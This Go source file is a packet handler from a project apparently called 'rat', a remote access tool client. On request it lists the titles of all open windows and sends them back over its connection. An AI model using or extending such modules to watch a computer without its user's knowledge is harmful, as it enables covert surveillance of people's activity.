package main

import (
	"rat/client/windows"
	"rat/common"
)

type WindowsPacket struct {
}

func (packet WindowsPacket) GetHeader() common.PacketHeader {
	return common.WindowsHeader
}

func (packet WindowsPacket) Write(c *Connection) error {
	windows.QueryWindows()

	c.WriteInt(len(windows.Windows))

	for _, win := range windows.Windows {
		c.WriteString(win.Title)
	}

	return nil
}

func (packet WindowsPacket) Read(c *Connection) error {
	Queue <- WindowsPacket{}

	return nil
}
